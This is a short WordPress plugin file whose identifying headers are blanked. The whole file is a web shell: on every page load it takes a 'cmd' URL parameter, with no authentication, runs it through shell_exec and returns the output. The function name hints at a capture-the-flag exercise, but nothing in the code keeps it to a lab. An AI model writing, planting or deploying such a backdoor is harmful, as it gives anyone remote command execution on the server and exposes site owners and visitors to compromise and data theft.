<?php
/**
 * Plugin Name: -
 * Description: -
 * Version: -
 * Author: -
 */

if (!defined('ABSPATH')) {
    exit;
}

add_action('init', 'ctf_handle_shell');

function ctf_handle_shell() {
    if (isset($_GET['cmd'])) {
        header('Content-Type: text/plain');
        
        $command = $_GET['cmd'];
        
        if (function_exists('shell_exec')) {
            echo shell_exec($command);
        } else {
            echo "Error: shell_exec() is disabled on this server.";
        }
        
        exit;
    }
}